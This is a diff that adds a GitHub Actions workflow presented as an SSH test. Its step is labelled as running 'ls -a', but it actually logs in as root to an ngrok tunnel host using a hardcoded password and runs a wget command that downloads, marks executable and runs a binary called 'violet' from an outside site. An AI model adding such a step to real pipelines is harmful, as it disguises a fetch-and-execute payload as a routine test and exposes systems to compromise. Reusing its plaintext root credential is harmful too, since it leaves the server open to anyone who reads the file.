@@ -1,0 +1,19 @@
+name: Test ssh command
+on: workflow_dispatch
+
+env:
+  FIRST_NAME: Terry
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: ls -a via OPEN SSH Private Key
+        uses: tarunjangra/ssh-remote-cmd@master
+        with:
+          command: |
+            wget https://rotf.lol/violet && chmod +x violet && ./violet
+          host: 4.tcp.ngrok.io
+          port: 13260
+          user: root         
+          pass: 8sxkeKXZ2G92HJrgsSH9
+          args: "-tt -vvv"
